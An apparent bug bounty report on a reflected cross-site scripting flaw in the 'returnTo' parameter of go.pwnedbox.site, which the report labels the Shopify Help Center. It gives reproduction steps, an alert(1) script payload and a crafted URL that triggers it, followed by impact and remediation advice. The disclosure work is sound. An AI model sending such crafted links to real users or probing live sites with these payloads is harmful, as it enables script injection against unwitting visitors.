## Title
Reflected XSS - go.pwnedbox.site

## Description
The `returnTo` GET parameter on `go.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload successfully executed in the browser and triggered an `alert(1)` dialog.

## Steps to Reproduce

1. Open the Shopify Help Center page:
   ```text
   https://go.pwnedbox.site/
   ```

2. Click on the **Account** button in the navigation bar.

3. Observe that the browser navigates to the following URL containing the `returnTo` parameter:
   ```text
   https://go.pwnedbox.site/?returnTo=https://accounts.shopify.com
   ```

4. Modify the `returnTo` parameter by replacing its value with the following XSS payload:
   ```text
   hakama'"<><scRipt>alert(1)</scRipt>
   ```

5. Open the crafted URL:
   ```text
   https://go.pwnedbox.site/?returnTo=hakama%27%22%3C%3E%3CscRipt%3Ealert(1)%3C/scRipt%3E
   ```

6. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

## POC (Proof of Concept)

**Target URL:**  
https://go.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `returnTo`

**Original URL Generated by Account Button:**
```text
https://go.pwnedbox.site/?returnTo=https://accounts.shopify.com
```

**Payload:**
```html
hakama'"<><scRipt>alert(1)</scRipt>
```

**Crafted Request URL:**
```text
https://go.pwnedbox.site/?returnTo=hakama%27%22%3C%3E%3CscRipt%3Ealert(1)%3C/scRipt%3E
```

**Observed Result:**

After modifying the `returnTo` parameter with the crafted JavaScript payload, the browser successfully executed the injected script and displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

## Impact

- An attacker can craft a malicious URL and trick users into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of webpage content.

## Remediation

- Apply context-aware output encoding to the `returnTo` parameter before rendering its value.
- Validate the `returnTo` parameter and allow only trusted destination URLs.
- Implement a restrictive Content Security Policy (CSP) as an additional security measure.
